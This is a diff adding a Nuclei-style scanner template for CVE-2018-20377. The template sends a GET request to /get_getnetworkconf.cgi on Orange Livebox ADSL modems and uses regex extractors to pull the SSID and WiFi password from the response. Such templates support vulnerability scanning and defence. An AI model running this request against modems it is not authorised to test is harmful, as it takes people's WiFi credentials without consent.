@@ -1,0 +1,35 @@
+id: cve-2018-20377
+info:
+  name: Orange Livebox ADSL Modem Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The Orange Livebox is an ADSL (Asymmetric Digital Subscriber Line) modem. A security vulnerability exists in Orange Livebox version 00.96.320S. A remote attacker could exploit this vulnerability by sending a GET request to the /get_getnetworkconf.cgi URI to obtain the device's SSID and WI-FI password.
+  reference:
+    - https://badpackets.net/over-19000-orange-livebox-adsl-modems-are-leaking-their-wifi-credentials/
+http:
+  - raw:
+      - |
+        GET /get_getnetworkconf.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "WPA<BR"
+    extractors:
+      - type: regex
+        name: ssid
+        group: 1
+        regex:
+          - '(?s)<body>(.*?)<BR>'
+      - type: regex
+        name: password
+        group: 1
+        regex:
+          - '(?s)<BR>(.*?)<BR>'
